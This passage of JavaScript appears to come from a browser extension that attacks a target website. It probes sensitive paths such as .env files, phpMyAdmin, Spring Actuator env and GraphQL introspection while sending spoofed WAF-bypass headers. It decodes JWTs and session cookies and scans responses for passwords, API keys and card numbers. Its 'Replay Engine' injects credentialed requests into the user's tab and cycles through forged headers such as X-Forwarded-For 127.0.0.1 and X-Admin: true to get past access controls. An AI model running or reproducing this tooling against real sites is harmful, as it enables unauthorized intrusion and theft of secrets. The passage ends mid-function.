    { path: "/.well-known/security.txt",    label: "security.txt" },
    { path: "/.well-known/host-meta",       label: "host-meta" },
    { path: "/api",                         label: "api root" },
    { path: "/api/v1",                      label: "api v1" },
    { path: "/api/v2",                      label: "api v2" },
    { path: "/v1",                          label: "v1 root" },
    { path: "/graphql",                     label: "graphql probe",
      method: "POST", headers: { "content-type": "application/json" },
      body: JSON.stringify({ query: "{ __typename }" }) },
    { path: "/graphql",                     label: "graphql introspection",
      method: "POST", headers: { "content-type": "application/json" },
      body: JSON.stringify({ query: "{ __schema { types { name kind } queryType { name } } }" }) },
    { path: "/.env",                        label: ".env file" },
    { path: "/.env.local",                  label: ".env.local" },
    { path: "/.env.production",             label: ".env.production" },
    { path: "/config.json",                 label: "config.json" },
    { path: "/config.php",                  label: "config.php" },
    { path: "/api/health",                  label: "health check" },
    { path: "/api/status",                  label: "status endpoint" },
    { path: "/api/user",                    label: "api user" },
    { path: "/api/users",                   label: "api users" },
    { path: "/wp-json/wp/v2",               label: "WordPress REST API" },
    { path: "/wp-json/wp/v2/users",         label: "WordPress users" },
    { path: "/adminer.php",                 label: "Adminer DB admin" },
    { path: "/phpmyadmin",                  label: "phpMyAdmin" },
    { path: "/phpmyadmin/",                 label: "phpMyAdmin slash" },
    { path: "/admin",                       label: "admin panel" },
    { path: "/admin/",                      label: "admin panel slash" },
    { path: "/swagger.json",                label: "Swagger spec" },
    { path: "/swagger.yaml",                label: "Swagger YAML" },
    { path: "/openapi.json",                label: "OpenAPI spec" },
    { path: "/openapi.yaml",                label: "OpenAPI YAML" },
    { path: "/api-docs",                    label: "API docs" },
    { path: "/sitemap.xml",                 label: "sitemap" },
    { path: "/server-status",               label: "Apache server-status" },
    { path: "/nginx_status",                label: "Nginx status" },
    { path: "/_status",                     label: "status page" },
    { path: "/metrics",                     label: "metrics endpoint" },
    { path: "/debug",                       label: "debug endpoint" },
    { path: "/info",                        label: "info endpoint" },
    { path: "/trace",                       label: "trace endpoint" },
    { path: "/actuator",                    label: "Spring Actuator" },
    { path: "/actuator/health",             label: "Spring health" },
    { path: "/actuator/env",                label: "Spring env (sensitive)" },
    { path: "/actuator/configprops",        label: "Spring configprops (sensitive)" },
    { path: "/__debug__",                   label: "Django debug" },
    { path: "/rails/info/properties",      label: "Rails info" },
    { path: "/api/settings",               label: "settings endpoint" },
    { path: "/api/config",                 label: "config endpoint" },
  ];

  const bypassHdrs = WAF_BYPASS_HEADERS[0];
  for (const rp of reconPaths) {
    if (!activeTraces.has(traceId)) break;
    const url = origin + rp.path;
    traceLog(traceId, "probe", "→ " + rp.label + " (" + url + ")");
    
    // First try with WAF bypass headers
    const reqOpts = {
      method: rp.method || "GET",
      headers: { ...bypassHdrs, ...(rp.headers || {}) },
      body: rp.body,
      timeout: 7000,
    };
    const result = await probeViaTab(url, reqOpts);
    
    if (result && !result.error) {
      if (result.status < 404) {
        analyzeResult(rp.label, url, result, bypassHdrs);
        traceLog(traceId, result.status < 400 ? "ok" : "warn",
          rp.label + " → " + result.status +
          (result.headers?.["server"] ? " [" + result.headers["server"] + "]" : ""));
      } else if (result.status === 403 || result.status === 401) {
        report.probes.push({ label: rp.label, url, status: result.status,
          findings: ["Auth-gated (" + result.status + ") — endpoint exists but requires credentials"],
          headers: { server: result.headers?.["server"] || "" } });
        traceLog(traceId, "warn", rp.label + " → " + result.status + " (auth wall — endpoint confirmed)");
      }
    }
  }

  // ── Phase 6: OPTIONS probe (allowed methods / CORS) ───────────────────────
  traceLog(traceId, "info", "Phase 6: OPTIONS probe (methods & CORS)");
  const optionsResult = await probeViaTab(origin + "/", { method: "OPTIONS", timeout: 6000 });
  if (optionsResult && !optionsResult.error) {
    const allow = optionsResult.headers?.["allow"] || optionsResult.headers?.["access-control-allow-methods"] || "";
    const cors = optionsResult.headers?.["access-control-allow-origin"] || "";
    if (allow) { report.evidence.push("Allowed methods: " + allow); traceLog(traceId, "info", "HTTP methods: " + allow); }
    if (cors === "*") { report.severity.push("CORS wildcard (*) — any origin can read responses"); traceLog(traceId, "critical", "CORS wildcard origin detected"); }
    if (cors) report.evidence.push("CORS allow-origin: " + cors);
    analyzeResult("options", origin + "/", optionsResult);
  }

  // ── Phase 7: Follow redirect chains + third-party tracing ─────────────────
  traceLog(traceId, "info", "Phase 7: Redirect chain tracing");
  if (capture.responseHeaders) {
    const location = capture.responseHeaders["location"] || capture.responseHeaders["Location"];
    if (location) {
      traceLog(traceId, "info", "Following Location: " + location);
      const redirResult = await probeViaTab(location, { timeout: 8000 });
      if (redirResult) {
        analyzeResult("redirect-target", location, redirResult);
        // If this is a different domain, look it up too
        try {
          const locHost = new URL(location).hostname;
          if (locHost !== targetDomain) {
            traceLog(traceId, "warn", "Third-party server: " + locHost + " — running recon");
            const tpOrigin = new URL(location).origin;
            const tpRecon = await probeViaTab(tpOrigin + "/robots.txt", { timeout: 6000 });
            if (tpRecon) analyzeResult("third-party-" + locHost, tpOrigin + "/robots.txt", tpRecon);
          }
        } catch {}
      }
    }
  }

  // ── Phase 8: Auth / JWT analysis ─────────────────────────────────────────
  traceLog(traceId, "info", "Phase 8: Auth & session analysis");
  const reqHdrs = capture.requestHeaders || {};
  if (reqHdrs["authorization"]) {
    const auth = reqHdrs["authorization"];
    if (auth.toLowerCase().startsWith("bearer ")) {
      const token = auth.slice(7).trim();
      try {
        const parts = token.split(".");
        if (parts.length === 3) {
          const hdr = JSON.parse(atob(parts[0].replace(/-/g, "+").replace(/_/g, "/")));
          const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
          report.jwtFound = { raw: token.slice(0, 100) + "…", header: hdr, payload };
          traceLog(traceId, "critical", "JWT decoded from auth header", payload);
        }
      } catch {}
    }
    report.evidence.push("Authorization: " + auth.slice(0, 50) + "…");
  }
  if (reqHdrs["cookie"]) {
    const cookies = reqHdrs["cookie"];
    report.evidence.push("Session cookies: " + cookies.slice(0, 100));
    // Look for session tokens
    const sessionPatterns = [/session=([^;]+)/, /sid=([^;]+)/, /token=([^;]+)/, /auth=([^;]+)/];
    for (const p of sessionPatterns) {
      const m = cookies.match(p);
      if (m) traceLog(traceId, "info", "Session token found in cookie: " + p.source.split("=")[0]);
    }
  }

  // ── Phase 9: Protocol cascade (http vs https) ────────────────────────────
  traceLog(traceId, "info", "Phase 9: Protocol cascade");
  const altProto = origin.startsWith("https") ? origin.replace("https://", "http://") : origin.replace("http://", "https://");
  const altResult = await probeViaTab(altProto + "/", { timeout: 6000 });
  if (altResult && !altResult.error && altResult.status !== 0) {
    analyzeResult("alt-protocol", altProto + "/", altResult);
    traceLog(traceId, "info", "Alt protocol → " + altResult.status + " server: " + (altResult.headers?.["server"] || "unknown"));
  }

  // ── Phase 10: Summarise ───────────────────────────────────────────────────
  traceLog(traceId, "info", "═══ Summary ═══");
  if (report.originIPs.length) traceLog(traceId, "ok", "Origin IPs: " + report.originIPs.join(", "));
  if (report.geoInfo.length) traceLog(traceId, "ok", "Hosted by: " + report.geoInfo.map(g => g.org + " (" + g.country + ")").join(", "));
  if (report.cdnLayer) traceLog(traceId, "warn", "CDN layer: " + report.cdnLayer + (report.cdnBypassed ? " [bypassed]" : " [not bypassed]"));
  if (report.wafDetected) traceLog(traceId, "warn", "WAF: " + report.wafDetected + (report.wafBypassed ? " [bypassed]" : " [active]"));
  if (report.databases.length) traceLog(traceId, "ok", "Databases: " + report.databases.join(", "));
  if (report.frameworks.length) traceLog(traceId, "ok", "Server software: " + report.frameworks.join(", "));
  if (report.clouds.length) traceLog(traceId, "ok", "Cloud/CDN: " + report.clouds.join(", "));
  if (report.proxyChain.length) traceLog(traceId, "info", "Proxy chain: " + report.proxyChain.join(" → "));
  if (report.thirdPartyChain.length) traceLog(traceId, "warn", "Third-party hops: " + report.thirdPartyChain.map(h => h.from + "→" + h.to).join(", "));
  if (report.severity.length) traceLog(traceId, "critical", "CRITICAL: " + report.severity.length + " findings");
  if (report.dnsRecords.length) traceLog(traceId, "info", "DNS: " + report.dnsRecords.map(r => r.type + "=" + r.value).join(", "));
  if (!report.databases.length && !report.frameworks.length && !report.wafDetected && !report.cdnLayer) {
    traceLog(traceId, "warn", "No stack detected — target may be well-hardened, behind an opaque proxy, or using custom server software");
  }

  activeTraces.delete(traceId);
  traceLog(traceId, "done", "Trace complete — " + report.probes.length + " endpoints probed");


  // ── Deep Payload, Auth & Server-Timing Analysis (IIFE scope) ─────────────
  await (async function deepAnalysis() {
    report.deepAnalysis = { serverTiming: [], authMechanisms: [], authTokens: [], cookies: [], requestPayload: null, responsePayload: null, sensitiveFields: [] };
    traceLog(traceId, "info", "Deep analysis: auth, payload, server-timing");

    var daRespHdrs = capture.responseHeaders || (origResult && origResult.headers) || {};
    var daReqHdrs = capture.requestHeaders || {};

    // 1. Server-Timing — reveals what backend spent time on
    var daStRaw = daRespHdrs["server-timing"] || daRespHdrs["Server-Timing"] || "";
    if (daStRaw) {
      daStRaw.split(",").forEach(function(daStPart) {
        var daStM = daStPart.trim().match(/^([^;]+)(?:;\s*dur=([\d.]+))?(?:;\s*desc="([^"]*)")?/);
        if (daStM) {
          var daStEntry = { name: daStM[1].trim(), dur: daStM[2] ? parseFloat(daStM[2]) : null, desc: daStM[3] || null };
          report.deepAnalysis.serverTiming.push(daStEntry);
          if (daStEntry.dur !== null && daStEntry.dur > 200) {
            report.severity = report.severity || [];
            report.severity.push("Slow backend op: " + daStEntry.name + " = " + daStEntry.dur + "ms");
          }
        }
      });
      traceLog(traceId, "ok", "Server-Timing: " + report.deepAnalysis.serverTiming.map(function(daT){ return daT.name + (daT.dur !== null ? "=" + daT.dur + "ms" : ""); }).join(", "));
    }

    // 2. JWT detection across all captured data
    function daDecodeJWT(daToken) {
      try {
        var daParts = daToken.split(".");
        if (daParts.length !== 3) return null;
        var daPad = function(s) { return s + "===".slice(0, (4 - s.length % 4) % 4); };
        var daB64 = function(s) { return JSON.parse(atob(daPad(s.replace(/-/g,"+").replace(/_/g,"/")))); };
        return { header: daB64(daParts[0]), payload: daB64(daParts[1]), raw: daToken.slice(0, 300) };
      } catch(e) { return null; }
    }
    var daAllText = [JSON.stringify(daReqHdrs), JSON.stringify(daRespHdrs), capture.requestBody||"", capture.responseBody||""].join(" ");
    var daJwtRe = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g;
    var daJwtM, daFoundJWTs = [];
    while ((daJwtM = daJwtRe.exec(daAllText)) !== null) {
      var daDecoded = daDecodeJWT(daJwtM[0]);
      if (daDecoded) daFoundJWTs.push(daDecoded);
    }
    if (daFoundJWTs.length) {
      report.deepAnalysis.authTokens = daFoundJWTs;
      if (!report.jwtFound) report.jwtFound = daFoundJWTs[0];
      daFoundJWTs.forEach(function(daJ) {
        traceLog(traceId, "critical", "JWT — alg:" + (daJ.header.alg||"?") + " sub:" + (daJ.payload.sub||daJ.payload.user_id||daJ.payload.id||"?") + " exp:" + (daJ.payload.exp ? new Date(daJ.payload.exp*1000).toISOString() : "none"));
      });
    }

    // 3. Auth mechanism fingerprint
    var daAuthVal = daReqHdrs["authorization"] || daReqHdrs["Authorization"] || "";
    if (daAuthVal) {
      if (daAuthVal.toLowerCase().startsWith("bearer ")) report.deepAnalysis.authMechanisms.push({ type: "Bearer JWT", value: daAuthVal.slice(7,80)+"…" });
      else if (daAuthVal.toLowerCase().startsWith("basic ")) report.deepAnalysis.authMechanisms.push({ type: "Basic Auth", value: "(base64 encoded credentials)" });
      else report.deepAnalysis.authMechanisms.push({ type: "Custom Auth Header", value: daAuthVal.slice(0,80) });
    }
    ["x-auth-token","x-access-token","x-api-key","x-token","x-session-id","x-csrf-token","x-xsrf-token","x-user-token"].forEach(function(daH) {
      var daHv = daReqHdrs[daH];
      if (daHv) report.deepAnalysis.authMechanisms.push({ type: daH, value: String(daHv).slice(0,80) });
    });
    var daCookieStr = daReqHdrs["cookie"] || daReqHdrs["Cookie"] || "";
    if (daCookieStr) report.deepAnalysis.authMechanisms.push({ type: "Cookie-based session", cookieCount: daCookieStr.split(";").length });
    if (daFoundJWTs.length) report.deepAnalysis.authMechanisms.push({ type: "JWT token", algs: daFoundJWTs.map(function(daJ){return daJ.header.alg;}).filter(Boolean) });
    if (report.deepAnalysis.authMechanisms.length) traceLog(traceId, "ok", "Auth: " + report.deepAnalysis.authMechanisms.map(function(daA){return daA.type;}).join(", "));

    // 4. Cookie analysis (request + response)
    daCookieStr.split(";").forEach(function(daCookiePair) {
      var daCParts = daCookiePair.split("=");
      if (!daCParts[0].trim()) return;
      report.deepAnalysis.cookies.push({ name: daCParts[0].trim(), val: daCParts.slice(1).join("=").slice(0,80), source: "request", sensitive: isSensitiveKey(daCParts[0].trim()) });
    });
    Object.entries(daRespHdrs).filter(function(daKv){ return daKv[0].toLowerCase()==="set-cookie"; }).forEach(function(daKv) {
      var daSetPairs = daKv[1].split(";"), daSetNv = daSetPairs[0].split("="), daSetAttrs = {};
      daSetPairs.slice(1).forEach(function(daSetP){ var daSetKv=daSetP.trim().split("="); daSetAttrs[daSetKv[0].toLowerCase().trim()]=daSetKv[1]||true; });
      report.deepAnalysis.cookies.push({ name: daSetNv[0].trim(), val: daSetNv.slice(1).join("=").slice(0,80), source: "response", attrs: daSetAttrs, sensitive: isSensitiveKey(daSetNv[0].trim()) });
    });
    var daSensitiveCookies = report.deepAnalysis.cookies.filter(function(daC){ return daC.sensitive; });
    if (daSensitiveCookies.length) traceLog(traceId, "critical", "Sensitive cookies: " + daSensitiveCookies.map(function(daC){ return daC.name; }).join(", "));

    // 5. Request payload decode
    if (capture.requestBody) {
      var daReqBody = capture.requestBody;
      var daReqCT = daReqHdrs["content-type"] || daReqHdrs["Content-Type"] || "";
      var daReqParsed = null;
      try { daReqParsed = (daReqCT.includes("json") || daReqBody.trim().startsWith("{") || daReqBody.trim().startsWith("[")) ? JSON.parse(daReqBody) : daReqBody; } catch(e) { daReqParsed = daReqBody; }
      report.deepAnalysis.requestPayload = { raw: daReqBody.slice(0,3000), parsed: daReqParsed, contentType: daReqCT };
      if (daReqParsed && typeof daReqParsed === "object") {
        Object.keys(daReqParsed).forEach(function(daRK){ if (isSensitiveKey(daRK)) report.deepAnalysis.sensitiveFields.push({ source:"request", key:daRK, hint:String(daReqParsed[daRK]).slice(0,60) }); });
      }
      traceLog(traceId, "ok", "Request body: " + daReqCT + " — " + daReqBody.length + " bytes");
    }

    // 6. Full response payload decode
    if (capture.responseBody) {
      var daRespBody = capture.responseBody;
      var daRespCT = daRespHdrs["content-type"] || daRespHdrs["Content-Type"] || "";
      var daRespParsed = null;
      try { daRespParsed = (daRespCT.includes("json") || daRespBody.trim().startsWith("{") || daRespBody.trim().startsWith("[")) ? JSON.parse(daRespBody) : daRespBody; } catch(e) { daRespParsed = daRespBody; }
      report.deepAnalysis.responsePayload = { raw: daRespBody.slice(0,8000), parsed: daRespParsed, contentType: daRespCT, size: daRespBody.length };
      function daScanSensitive(daObj, daDepth) {
        if (!daObj || typeof daObj !== "object" || daDepth > 5) return;
        Object.keys(daObj).forEach(function(daOK) {
          if (isSensitiveKey(daOK)) report.deepAnalysis.sensitiveFields.push({ source:"response", key:daOK, hint:String(daObj[daOK]).slice(0,60) });
          daScanSensitive(daObj[daOK], daDepth+1);
        });
      }
      if (daRespParsed && typeof daRespParsed === "object") daScanSensitive(daRespParsed, 0);
      if (report.deepAnalysis.sensitiveFields.length) traceLog(traceId, "critical", "Sensitive fields: " + report.deepAnalysis.sensitiveFields.map(function(daF){ return "["+daF.source+"] "+daF.key; }).join(", "));
      traceLog(traceId, "ok", "Response body: " + daRespCT + " — " + daRespBody.length + " bytes");
    }
  })();
  traceDone(traceId, report);
}

// ── Replay Engine ─────────────────────────────────────────────────────────────
const activeReplays = new Map();

function replayLog(replayId, level, text, data) {
  chrome.runtime.sendMessage({ type: "REPLAY_LOG", entry: { replayId, level, text, data: data || null, ts: Date.now() } }).catch(() => {});
}
function replayDone(replayId, result) {
  chrome.runtime.sendMessage({ type: "REPLAY_DONE", replayId, result }).catch(() => {});
}

// Headers browsers block from being set — skip these
const BLOCKED_HEADERS = new Set([
  "host","content-length","transfer-encoding","trailer","te","upgrade",
  "connection","keep-alive","proxy-connection","origin","referer",
]);

// Headers to always add for a convincing replay
const SIMULATION_HEADERS_BASE = {
  "accept": "application/json, text/plain, */*",
  "accept-language": "en-US,en;q=0.9",
  "sec-fetch-dest": "empty",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "same-origin",
};

// Bypass attempt sequences if original request fails
const REPLAY_BYPASS_SETS = [
  // 1. Exact clone — inherit tab cookies, no extra headers (baseline)
  {},
  // 2. WAF bypass: appear to come from internal IP
  { "X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1", "X-Originating-IP": "127.0.0.1" },
  // 3. CF bypass: appear to be a verified connecting IP
  { "CF-Connecting-IP": "127.0.0.1", "True-Client-IP": "127.0.0.1" },
  // 4. API bot appearance
  { "X-Forwarded-For": "66.249.66.1", "Accept": "application/json" },
  // 5. Admin origin
  { "X-Forwarded-For": "10.0.0.1", "X-Internal-Request": "1", "X-Admin": "true" },
  // 6. Remove referer / origin restrictions
  { "Origin": "", "Referer": "" },
  // 7. Different Accept to bypass content negotiation
  { "Accept": "*/*", "Accept-Encoding": "identity" },
];

async function runReplay(capture, replayId, tabId, overrides) {
  activeReplays.set(replayId, true);

  const result = {
    replayId,
    url: capture.url || "",
    method: capture.method || "GET",
    attempts: [],
    successAttempt: null,
    requestAnalysis: analyzeRequestBody(capture),
    finalStatus: null,
    finalHeaders: {},
    finalBody: "",
    bypassUsed: null,
    timing: null,
    cookies: null,
    redirectChain: [],
  };

  replayLog(replayId, "info", "═══ Request Replay Simulator ═══");
  replayLog(replayId, "info", "Target: " + result.method + " " + result.url);

  // Log request analysis
  if (result.requestAnalysis.authTokens.length) {
    for (const tok of result.requestAnalysis.authTokens) {
      replayLog(replayId, "warn", "Auth token found: " + tok.type + " → " + tok.value.slice(0, 40) + "…");
      if (tok.decoded) replayLog(replayId, "critical", "JWT decoded", tok.decoded);
    }
  }
  if (result.requestAnalysis.fields.length) {
    replayLog(replayId, "info", "Request body fields: " + result.requestAnalysis.fields.map(f => f.key).join(", "));
  }
  if (result.requestAnalysis.contentType) {
    replayLog(replayId, "info", "Content-Type: " + result.requestAnalysis.contentType);
  }

  // ── Execute replay attempts ─────────────────────────────────────────────────
  const cleanHeaders = buildReplayHeaders(capture, overrides);

  for (let i = 0; i < REPLAY_BYPASS_SETS.length; i++) {
    if (!activeReplays.has(replayId)) break;

    const bypassHdrs = REPLAY_BYPASS_SETS[i];
    const finalHeaders = { ...cleanHeaders, ...bypassHdrs };
    const attemptLabel = i === 0 ? "Exact clone" : "Bypass set #" + i;

    replayLog(replayId, i === 0 ? "info" : "probe", "Attempt " + (i+1) + ": " + attemptLabel);

    const attempt = await executeReplay(tabId, {
      url: overrides.url || capture.url,
      method: overrides.method || capture.method || "GET",
      headers: finalHeaders,
      body: overrides.body !== undefined ? overrides.body : (capture.requestBody || null),
      ct: capture.responseHeaders?.["content-type"] || "",
    });

    const att = {
      attempt: i + 1,
      label: attemptLabel,
      bypassHeaders: Object.keys(bypassHdrs).length ? bypassHdrs : null,
      headersUsed: finalHeaders,
      ...attempt,
    };
    result.attempts.push(att);

    if (attempt.error) {
      replayLog(replayId, "warn", "Attempt " + (i+1) + " error: " + attempt.error);
      continue;
    }

    const sc = attempt.status;
    const scLabel = sc < 300 ? "✓ SUCCESS" : sc < 400 ? "→ redirect" : sc < 500 ? "✗ client error" : "✗ server error";
    replayLog(replayId, sc < 300 ? "ok" : sc < 400 ? "warn" : "warn",
      "Attempt " + (i+1) + " → " + sc + " " + scLabel + (attempt.timing ? " (" + attempt.timing + "ms)" : ""));

    // Show server header
    if (attempt.headers?.["server"]) replayLog(replayId, "info", "Server: " + attempt.headers["server"]);

    // Show redirect
    if (attempt.redirectTo) {
      result.redirectChain.push({ from: capture.url, to: attempt.redirectTo });
      replayLog(replayId, "info", "Redirect → " + attempt.redirectTo);
    }

    // Check if response has useful data
    const bodyAnalysis = analyzeResponseBody(attempt.body || "", attempt.headers || {});
    if (bodyAnalysis.findings.length) {
      for (const f of bodyAnalysis.findings) replayLog(replayId, "critical", f);
    }

    // SUCCESS: 2xx or a meaningful response (3xx with body, specific 4xx)
    const isSuccess = sc >= 200 && sc < 300;
    const isMeaningful = sc >= 200 && sc < 500 && sc !== 405;

    if (isSuccess || (i > 0 && isMeaningful)) {
      result.successAttempt = i + 1;
      result.finalStatus = sc;
      result.finalHeaders = attempt.headers || {};
      result.finalBody = attempt.body || "";
      result.bypassUsed = Object.keys(bypassHdrs).length ? bypassHdrs : null;
      result.timing = attempt.timing;
      replayLog(replayId, "ok", "Request succeeded on attempt " + (i+1) + (result.bypassUsed ? " with bypass headers" : " — no bypass needed"));
      break;
    }

    // If we got 401/403 with a body, it might have interesting info too
    if ((sc === 401 || sc === 403) && attempt.body && attempt.body.length > 20) {
      result.finalStatus = sc;
      result.finalHeaders = attempt.headers || {};
      result.finalBody = attempt.body;
    }

    // After attempt 1 (exact clone) if still failing, log and try next bypass
    if (i === 0 && !isSuccess) {
      replayLog(replayId, "warn", "Exact clone got " + sc + " — trying WAF bypass headers…");
    }
  }

  if (!result.successAttempt && !result.finalStatus) {
    replayLog(replayId, "warn", "All bypass attempts exhausted — endpoint may require server-side session or is fully blocked");
  }

  replayLog(replayId, "done", "Replay complete — " + result.attempts.length + " attempts");
  activeReplays.delete(replayId);
  replayDone(replayId, result);
}

async function executeReplay(tabId, opts) {
  if (!tabId) return { error: "No tab context available — open a page first" };
  try {
    const results = await chrome.scripting.executeScript({
      target: { tabId },
      func: async (opts) => {
        const t0 = Date.now();
        try {
          const ctrl = new AbortController();
          const timeout = setTimeout(() => ctrl.abort(), 15000);

          // Build fetch init
          const init = {
            method: opts.method,
            credentials: "include",
            redirect: "follow",
            signal: ctrl.signal,
          };

          // Add headers (skip empty values)
          const hdrEntries = Object.entries(opts.headers || {}).filter(([k,v]) => v !== "" && v != null);
          if (hdrEntries.length) init.headers = Object.fromEntries(hdrEntries);

          // Add body for non-GET methods
          if (opts.body && !["GET","HEAD"].includes(opts.method.toUpperCase())) {
            init.body = opts.body;
          }

          const res = await fetch(opts.url, init);
          clearTimeout(timeout);

          const timing = Date.now() - t0;
          const hdrs = {};
          res.headers.forEach((v, k) => { hdrs[k] = v; });

          // Try to get the full response body
          let body = null;
          const ct = res.headers.get("content-type") || "";
          // Always try to read body regardless of content-type
          try {
            const text = await res.text();
            body = text.slice(0, 16000); // Up to 16KB
          } catch {}

          // Get cookies from document
          const cookies = document.cookie || "";

          return {
            status: res.status,
            statusText: res.statusText,
            finalUrl: res.url,
            redirectTo: res.redirected && res.url !== opts.url ? res.url : null,
            headers: hdrs,
            body,
            timing,
            cookies: cookies.slice(0, 500),
          };
        } catch (e) {
          return { error: e.name === "AbortError" ? "Request timed out (15s)" : e.message, timing: Date.now() - t0 };
        }
      },
      args: [opts],
    });
    return results?.[0]?.result || { error: "Script execution failed" };
  } catch (e) {
    return { error: "Tab injection failed: " + e.message };
  }
}

function buildReplayHeaders(capture, overrides) {
  const out = { ...SIMULATION_HEADERS_BASE };

  // Copy original request headers (skip browser-controlled ones)
  const reqHdrs = capture.requestHeaders || {};
  for (const [k, v] of Object.entries(reqHdrs)) {
    const kl = k.toLowerCase();
    if (!BLOCKED_HEADERS.has(kl) && v) out[k] = v;
  }

  // Ensure content-type is preserved for POST/PUT/PATCH
  if (capture.requestBody && !out["content-type"] && !out["Content-Type"]) {
    // Detect content type from body
    const body = String(capture.requestBody || "");
    if (body.startsWith("{") || body.startsWith("[")) out["content-type"] = "application/json";
    else if (body.includes("=")) out["content-type"] = "application/x-www-form-urlencoded";
    else out["content-type"] = "text/plain";
  }

  // Apply overrides
  for (const [k, v] of Object.entries(overrides.headers || {})) {
    if (v !== null && v !== undefined) out[k] = v;
    else delete out[k];
  }

  return out;
}

function analyzeRequestBody(capture) {
  const analysis = {
    contentType: null,
    format: null,
    fields: [],
    authTokens: [],
    rawBody: capture.requestBody || null,
    parsedBody: null,
  };

  // Detect content type
  const hdrs = capture.requestHeaders || {};
  const ct = hdrs["content-type"] || hdrs["Content-Type"] || "";
  analysis.contentType = ct;

  // Parse body
  const body = String(capture.requestBody || "");
  if (body) {
    if (ct.includes("application/json") || body.trim().startsWith("{") || body.trim().startsWith("[")) {
      analysis.format = "json";
      try {
        const parsed = JSON.parse(body);
        analysis.parsedBody = parsed;
        analysis.fields = flattenObject(parsed);
      } catch {
        analysis.fields = [{ key: "raw", value: body.slice(0, 200), type: "string" }];
      }
    } else if (ct.includes("application/x-www-form-urlencoded") || body.includes("=")) {
      analysis.format = "form";
      try {
        const params = new URLSearchParams(body);
        for (const [k, v] of params) analysis.fields.push({ key: k, value: v, type: "form-field", sensitive: isSensitiveKey(k) });
      } catch {}
    } else if (ct.includes("multipart")) {
      analysis.format = "multipart";
      analysis.fields = [{ key: "multipart-body", value: "[multipart data]", type: "binary" }];
    } else if (ct.includes("application/xml") || ct.includes("text/xml") || body.trim().startsWith("<")) {
      analysis.format = "xml";
      const tagMatches = [...body.matchAll(/<([^/?!][^>]*)>([^<]{1,200})<\/[^>]+>/g)];
      for (const m of tagMatches.slice(0, 30)) analysis.fields.push({ key: m[1].trim(), value: m[2].trim(), type: "xml-node", sensitive: isSensitiveKey(m[1]) });
    } else if (body.includes("query") || body.includes("mutation")) {
      analysis.format = "graphql";
      analysis.fields = [{ key: "query", value: body.slice(0, 300), type: "graphql" }];
    } else {
      analysis.format = "raw";
      analysis.fields = [{ key: "body", value: body.slice(0, 200), type: "raw" }];
    }
  }

  // Extract auth tokens from request headers
  for (const [k, v] of Object.entries(hdrs)) {
    const kl = k.toLowerCase();
    if (kl === "authorization") {
      if (v.toLowerCase().startsWith("bearer ")) {
        const tok = v.slice(7).trim();
        const decoded = tryDecodeJWT(tok);
        analysis.authTokens.push({ type: "Bearer JWT", header: k, value: tok, decoded });
      } else if (v.toLowerCase().startsWith("basic ")) {
        try {
          const decoded = atob(v.slice(6).trim());
          analysis.authTokens.push({ type: "Basic Auth", header: k, value: v, decoded: { credentials: decoded } });
        } catch {}
        analysis.authTokens.push({ type: "Basic Auth", header: k, value: v, decoded: null });
      } else {
        analysis.authTokens.push({ type: "Authorization", header: k, value: v, decoded: null });
      }
    } else if (["x-api-key","api-key","x-auth-token","x-access-token","x-token","apikey","token"].includes(kl)) {
      analysis.authTokens.push({ type: kl, header: k, value: v, decoded: tryDecodeJWT(v) });
    }
  }

  // Extract auth tokens from fields
  for (const f of analysis.fields) {
    if (isSensitiveKey(f.key)) {
      const decoded = tryDecodeJWT(String(f.value || ""));
      if (decoded) analysis.authTokens.push({ type: "JWT in body[" + f.key + "]", value: String(f.value), decoded });
    }
  }

  return analysis;
}

function analyzeResponseBody(body, headers) {
  const findings = [];
  const bodyLow = body.toLowerCase();
  const ct = headers["content-type"] || "";

  // Sensitive data in response
  const sensitivePatterns = [
    { re: /["']?password["']?\s*[=:]\s*["']?([^"',\s\]}{]{4,})/gi, label: "Password in response" },
    { re: /["']?secret["']?\s*[=:]\s*["']?([^"',\s\]}{]{4,})/gi, label: "Secret in response" },
    { re: /["']?api_?key["']?\s*[=:]\s*["']?([^"',\s\]}{]{8,})/gi, label: "API key in response" },
    { re: /["']?token["']?\s*[=:]\s*["']?([A-Za-z0-9\-_\.]{20,})/gi, label: "Token in response" },
    { re: /["']?private_?key["']?\s*[=:]\s*["']?([^"',\s\]}{]{10,})/gi, label: "Private key in response" },
    { re: /eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*/g, label: "JWT token in response body" },
    { re: /(postgresql|postgres|mysql|mongodb|redis):\/\/[^\s"'<>]+/gi, label: "Database connection string" },
    { re: /\b\d{16}\b|\b\d{4}[\s\-]\d{4}[\s\-]\d{4}[\s\-]\d{4}\b/g, label: "Possible credit card number" },
    { re: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z]{2,}\b/gi, label: "Email address" },
    { re: /internal server error|stack trace|sql syntax|exception in thread/gi, label: "Error/stack trace leak" },
    { re: /\/home\/\w+\/|\/var\/www\/|\/etc\/passwd|c:\\users\\/gi, label: "Server file path exposed" },
  ];

  for (const sp of sensitivePatterns) {
    const matches = body.match(sp.re);
    if (matches) findings.push(sp.label + ": " + matches[0].slice(0, 80));
  }

  // Check for error responses that reveal info
  if (body.includes("SQL") || body.includes("mysql_fetch") || body.includes("ORA-")) findings.push("SQL error in response — DB type revealed");
  if (body.includes("stack") && body.includes("Error") && body.includes(".js:")) findings.push("Node.js stack trace in response");

  return { findings, contentType: ct };
}

function flattenObject(obj, prefix, depth) {
  if (!prefix) prefix = "";
  if (!depth) depth = 0;
  const fields = [];
  if (!obj || typeof obj !== "object" || depth > 5) return fields;
  for (const [k, v] of Object.entries(obj)) {
    const fullKey = prefix ? prefix + "." + k : k;
    const sensitive = isSensitiveKey(k);
    if (v && typeof v === "object" && !Array.isArray(v)) {
      fields.push(...flattenObject(v, fullKey, depth + 1));
    } else {
      fields.push({ key: fullKey, value: String(v === null ? "null" : v).slice(0, 200), type: Array.isArray(v) ? "array" : typeof v, sensitive });
    }
  }
  return fields;
}

function isSensitiveKey(k) {
  const kl = k.toLowerCase();
  return ["password","passwd","pass","secret","token","key","api_key","apikey","auth","authorization",
    "private","credential","session","jwt","ssn","card","cvv","pin","hash","salt","hmac"].some(s => kl.includes(s));
}

function tryDecodeJWT(tok) {
  if (!tok || typeof tok !== "string") return null;
  const parts = tok.split(".");
  if (parts.length !== 3) return null;
  try {
